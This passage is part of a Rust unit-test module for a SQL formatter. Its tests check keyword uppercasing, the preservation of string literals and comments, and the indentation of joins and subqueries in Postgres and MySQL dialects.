        let want = "SELECT c.country,\n  count(*) AS orders\nFROM sales.orders o\nJOIN sales.customers c ON c.id = o.customer_id\nWHERE o.status = 'shipped'\n  AND o.amount > 10\nGROUP BY 1\nORDER BY orders DESC;";
        assert_eq!(got, want);
    }

    #[test]
    fn keeps_strings_and_comments() {
        let got = format_sql(Dialect::Postgres, "-- top\nselect 'from where' as x, \"Select\" from t");
        assert!(got.starts_with("-- top\nSELECT 'from where' AS x,"), "{got}");
        assert!(got.contains("\"Select\""));
    }

    #[test]
    fn indents_subqueries_and_left_join() {
        let got = format_sql(Dialect::MySql, "select * from a left join b on a.id=b.id where a.id in (select id from c where x=1)");
        assert!(got.contains("\nLEFT JOIN b ON a.id = b.id"), "{got}");
        assert!(got.contains("IN (\n  SELECT id"), "{got}");
    }
}
